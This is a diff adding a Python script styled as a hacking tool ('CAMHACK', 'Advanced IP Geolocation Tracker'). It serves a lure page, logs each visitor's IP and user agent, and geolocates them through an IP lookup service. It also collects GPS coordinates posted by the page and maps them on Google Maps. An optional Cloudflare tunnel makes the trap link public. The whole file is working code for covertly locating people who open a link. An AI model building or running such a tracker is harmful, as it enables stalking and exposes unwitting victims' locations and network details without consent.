@@ -1,0 +1,186 @@
+import os
+import sys
+import json
+import time
+import threading
+import subprocess
+import requests
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from colorama import Fore, Style, init
+import re
+from urllib.parse import urlparse
+
+# INICIALIZACIÓN
+init(autoreset=True)
+
+# SISTEMA DE COLORES MEJORADO
+class Colors:
+    HEADER = '\033[95m'
+    BLUE = '\033[94m'
+    CYAN = '\033[96m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    WHITE = '\033[97m'
+    GRAY = '\033[90m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    RESET = '\033[0m'
+
+# BANNER ACTUALIZADO
+def show_banner():
+    os.system("clear" if os.name == "posix" else "cls")
+    print(f"{Colors.GREEN}{Colors.BOLD}")
+    print(" ██████╗ █████╗ ███╗   ███╗██╗  ██╗██╗  ██╗ ██████╗██╗  ██╗")
+    print("██╔════╝██╔══██╗████╗ ████║██║  ██║██║  ██║██╔════╝██║ ██╔╝")
+    print("██║     ███████║██╔████╔██║███████║███████║██║     █████╔╝ ")
+    print("██║     ██╔══██║██║╚██╔╝██║██╔══██║╚════██║██║     ██╔═██╗ ")
+    print("╚██████╗██║  ██║██║ ╚═╝ ██║██║  ██║     ██║╚██████╗██║  ██╗")
+    print(" ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝")
+    print(f"{Colors.WHITE}           Advanced IP Geolocation Tracker")
+    print(f"{Colors.GRAY}               by D3SPA1R x KVSR{Colors.RESET}\n")
+
+class RequestHandler(BaseHTTPRequestHandler):
+    def log_request(self, code='-', size='-'): pass
+
+    def get_client_ip(self):
+        """Obtiene la IP real del cliente, incluso detrás de proxy"""
+        ip = self.headers.get('X-Forwarded-For', self.client_address[0])
+        if ',' in ip:
+            ip = ip.split(',')[0].strip()
+        return ip
+
+    def do_GET(self):
+        if self.path == '/':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            with open('index.html', 'rb') as f:
+                self.wfile.write(f.read())
+            self.log_connection()
+
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        
+        if self.path == '/gps_data':
+            try:
+                data = json.loads(post_data.decode())
+                lat, lon = data.get('lat'), data.get('lon')
+                source = data.get('source', 'GPS')
+
+                with open("gps.log", "a") as log_file:
+                    log_file.write(f"{source} | {time.ctime()} | https://www.google.com/maps?q={lat},{lon}\n")
+
+                print(f"\n{Colors.GREEN}[{Colors.WHITE}+{Colors.GREEN}] {Colors.CYAN}New Location Obtained:{Colors.RESET}")
+                print(f"{Colors.YELLOW}┌───────────────────────────────────────────────")
+                print(f"│ {Colors.WHITE}Source: {Colors.GREEN}{source}")
+                print(f"│ {Colors.WHITE}Coordinates: {Colors.CYAN}{lat}, {lon}")
+                print(f"│ {Colors.WHITE}Google Maps: {Colors.BLUE}https://www.google.com/maps?q={lat},{lon}")
+                print(f"└───────────────────────────────────────────────{Colors.RESET}")
+                
+                self.send_response(200)
+                self.end_headers()
+            except Exception as e:
+                print(f"{Colors.RED}[!] Error processing GPS data: {e}{Colors.RESET}")
+
+    def log_connection(self):
+        """Registra y muestra información detallada de la conexión"""
+        ip = self.get_client_ip()
+        
+        print(f"\n{Colors.GREEN}[{Colors.WHITE}+{Colors.GREEN}] {Colors.CYAN}New Connection Detected:{Colors.RESET}")
+        print(f"{Colors.YELLOW}┌───────────────────────────────────────────────")
+        print(f"│ {Colors.WHITE}Client IP: {Colors.GREEN}{ip}")
+        
+        try:
+            # Usamos una API más confiable para geolocalización
+            response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,proxy,hosting,query")
+            geo_data = response.json()
+            
+            if geo_data.get('status') == 'success':
+                print(f"│ {Colors.WHITE}ISP: {Colors.CYAN}{geo_data.get('isp', 'Unknown')}")
+                print(f"│ {Colors.WHITE}Organization: {Colors.CYAN}{geo_data.get('org', 'Unknown')}")
+                print(f"│ {Colors.WHITE}Location: {Colors.GREEN}{geo_data.get('city', 'Unknown')}, {geo_data.get('regionName', 'Unknown')}, {geo_data.get('country', 'Unknown')}")
+                print(f"│ {Colors.WHITE}Coordinates: {Colors.CYAN}{geo_data.get('lat', 'Unknown')}, {geo_data.get('lon', 'Unknown')}")
+                print(f"│ {Colors.WHITE}Google Maps: {Colors.BLUE}https://www.google.com/maps?q={geo_data.get('lat')},{geo_data.get('lon')}")
+                print(f"│ {Colors.WHITE}Timezone: {Colors.GREEN}{geo_data.get('timezone', 'Unknown')}")
+                print(f"│ {Colors.WHITE}Proxy/VPN: {Colors.GREEN}{'Yes' if geo_data.get('proxy') or geo_data.get('hosting') else 'No'}")
+            else:
+                print(f"│ {Colors.RED}Geolocation failed: {geo_data.get('message', 'Unknown error')}")
+                
+        except Exception as e:
+            print(f"│ {Colors.RED}Error getting geolocation: {str(e)}")
+        
+        print(f"└───────────────────────────────────────────────{Colors.RESET}")
+        
+        # Registrar en archivo log
+        with open("connections.log", "a") as log_file:
+            log_file.write(f"{time.ctime()} | IP: {ip} | User-Agent: {self.headers.get('User-Agent', 'Unknown')}\n")
+
+def start_local_server():
+    server = HTTPServer(('0.0.0.0', 8080), RequestHandler)
+    print(f"\n{Colors.GREEN}[{Colors.WHITE}+{Colors.GREEN}] {Colors.CYAN}Local server running at {Colors.WHITE}http://0.0.0.0:8080")
+    print(f"{Colors.YELLOW}─────────────────────────────────────────────────{Colors.RESET}")
+    server.serve_forever()
+
+def start_cloudflared_tunnel():
+    try:
+        print(f"{Colors.GREEN}[{Colors.WHITE}+{Colors.GREEN}] {Colors.CYAN}Starting Cloudflare tunnel...{Colors.RESET}")
+        process = subprocess.Popen(
+            ['cloudflared', 'tunnel', '--url', 'http://localhost:8080'],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            universal_newlines=True
+        )
+        
+        for line in process.stdout:
+            if "trycloudflare.com" in line:
+                url = re.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', line).group(0)
+                print(f"\n{Colors.GREEN}[{Colors.WHITE}✔{Colors.GREEN}] {Colors.CYAN}Tunnel active: {Colors.WHITE}{url}")
+                print(f"{Colors.YELLOW}─────────────────────────────────────────────────{Colors.RESET}")
+                break
+                
+    except FileNotFoundError:
+        print(f"{Colors.RED}[{Colors.WHITE}!{Colors.RED}] {Colors.WHITE}Cloudflared not found. Install it from:")
+        print(f"{Colors.BLUE}https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/{Colors.RESET}")
+        sys.exit(1)
+
+def main_menu():
+    show_banner()
+    print(f"{Colors.WHITE}Select operation mode:{Colors.RESET}")
+    print(f"  {Colors.GREEN}[1]{Colors.WHITE} Local Mode (LAN)")
+    print(f"  {Colors.GREEN}[2]{Colors.WHITE} Internet Mode (Cloudflared)")
+    print(f"  {Colors.GREEN}[3]{Colors.WHITE} Exit\n")
+    
+    while True:
+        choice = input(f"{Colors.GRAY}>> {Colors.RESET}").strip()
+        
+        if choice == '1':
+            start_local_server()
+            break
+        elif choice == '2':
+            # Iniciar servidor en segundo plano
+            server_thread = threading.Thread(target=start_local_server, daemon=True)
+            server_thread.start()
+            
+            # Esperar un momento para que el servidor se inicie
+            time.sleep(2)
+            
+            # Iniciar tunnel Cloudflare
+            start_cloudflared_tunnel()
+            
+            # Mantener el programa corriendo
+            while True:
+                time.sleep(1)
+        elif choice == '3':
+            print(f"{Colors.RED}[!] Exiting...{Colors.RESET}")
+            sys.exit(0)
+        else:
+            print(f"{Colors.RED}[!] Invalid option{Colors.RESET}")
+
+if __name__ == '__main__':
+    try:
+        main_menu()
+    except KeyboardInterrupt:
+        print(f"\n{Colors.RED}[!] Server stopped by user{Colors.RESET}")
+        sys.exit(0)
